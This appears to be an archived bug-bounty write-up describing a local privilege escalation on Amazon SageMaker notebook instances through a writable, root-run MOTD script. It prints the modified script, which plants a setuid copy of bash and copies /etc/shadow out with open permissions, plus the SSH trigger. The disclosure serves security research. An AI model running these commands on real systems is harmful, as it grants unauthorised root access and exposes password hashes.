# Privilege Escalation on Amazon Linux (SageMaker)

- **Source URL:** https://medium.com/@rickconsole/privilege-escalation-on-amazon-linux-sagemaker-cf115042ea5f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240929181114/https://medium.com/@rickconsole/privilege-escalation-on-amazon-linux-sagemaker-cf115042ea5f
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7392 (id 7392)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Privilege Escalation on Amazon Linux (SageMaker)

On a recent pentest I discovered a privilege escalation in GCP’s Vertex AI notebook instances, and wanted to see if Amazon SageMaker had any similar misconfigurations. I will likely make a post about the GCP privesc soon.

Companies interested in developing AI/ML tools can make use of services like Amazon SageMaker to quickly deploy GPU-powered compute instances, complete with Jupyter Notebooks. Naturally, companies would not be comfortable giving every developer root access to these systems, so SageMaker allows administrators to deploy instances that prevent these developers from having such access as seen below:

The way this configuration functions is actually quite interesting. These systems come shipped with docker installed, but, when root access is disabled, the **docker** service is run in [\[rootless\]](https://docs.docker.com/engine/security/rootless/) mode. This prevents the privesc method of launching a docker image and chrooting into the instance’s filesystem to basically provide full root access to the instance (Foreshadowing for the GCP escalation). Since we turned **rootless** mode on, we’re going to need to find a different way to escalate!

# Initial Setup

In **Amazon SageMaker -> Notebooks -> Create Notebook Instance**, create an instance with any name, and ensure that **Root Access** is set to **Disabled** as shown in the screenshot above.

Once it has started, open the jupyter notebook and launch a terminal using the **New** dropdown:

This will give you a low privilege shell as **ec2-user**. We are unable to use **sudo**, as we don’t know our user’s password. (Spoiler alert: there is no password :/ )

# Finding the Privesc Vector

After digging around on the filesystem, trying to check for loose permissions, I found something interesting:

It appears that our **ec2-user** has **write** access to a motd script inside the **/etc/update-motd.d** directory. This means that we have write access to the script that will run any time a user logs into the server (the message of the day). And the best part is: these scripts run as **root**!

I edited the file to execute some commands to prove out a privesc vuln:

```
#!/bin/sh
cat << EOF
=============================================================================
AMI Name: Deep Learning OSS Nvidia Driver AMI (Amazon Linux 2) Version 78
Supported EC2 instances: G4dn, G5, G6, Gr6, P4d, P4de, P5
* To activate pre-built tensorflow environment, run: 'source activate tensorflow2_p310'
* To activate pre-built pytorch environment, run: 'source activate pytorch_p310'
* To activate pre-built python3 environment, run: 'source activate python3'
* For Neuron workflows, please use Neuron Multi-framework DLAMI mentioned in release notes
NVIDIA driver version: 535.183.01
CUDA versions available: cuda-11.8 cuda-12.1 cuda-12.2 cuda-12.3
Default CUDA version is 12.1
Release notes: https://docs.aws.amazon.com/dlami/latest/devguide/appendix-ami-release-notes.html
AWS Deep Learning AMI Homepage: https://aws.amazon.com/machine-learning/amis/
Developer Guide and Release Notes: https://docs.aws.amazon.com/dlami/latest/devguide/what-is-dlami.html
Support: https://forums.aws.amazon.com/forum.jspa?forumID=263
For a fully managed experience, check out Amazon SageMaker at https://aws.amazon.com/sagemaker
=============================================================================
EOF
###### This is where the fun begins ######
cp /bin/bash /home/ec2-user/bash && chmod u+s /home/ec2-user/bash
cp /etc/shadow /home/ec2-user/shadow && chmod 777 /home/ec2-user/shadow
echo "success" > /home/ec2-user/success.txt
```
And SSH’d in as myself to trigger the MOTD:

`ssh ec2-user@127.0.0.1`
Hmm, that’s odd. The new script didnt execute the new commands that I’m adding. It seems like the **motd** is cached.

After running this by my good friend [Ariyan](https://github.com/Ar1yan), he found that Amazon Linux has a repo containing their **update-motd** systemd service, and there was a file containing some very useful information:

```
# https://github.com/amazonlinux/update-motd/blob/main/update-motd.timer
[Unit]
Description=Timer for Dynamically Generate Message Of The Day
[Timer]
OnUnitActiveSec=720min
RandomizedDelaySec=720min
FixedRandomDelay=true
Persistent=true
[Install]
WantedBy=timers.target
```
It appears that this service refreshes the **motd** cache every 12 hours at a minimum, and then has an additional 12 hour “jitter”. This means that the **motd** cache updates at *most* every 24 hours. So, with my fingers crossed, I waited the full potential time, and would check back the next day.

At 8pm I logged into the notebook instance, SSH’d into myself, and behold!

It appears that the **bash** binary was copied over with the correct permissions, and we have a **shadow** file as well!

Overall this was a pretty cool privesc method and I was surprised to see it on an instance that supposedly had locked down my **ec2-user** account!

Unfortunately, AWS does not have a bug bounty program, so the most I could do was tell them about it. This was several weeks ago and there has been no development or updates into a fix.
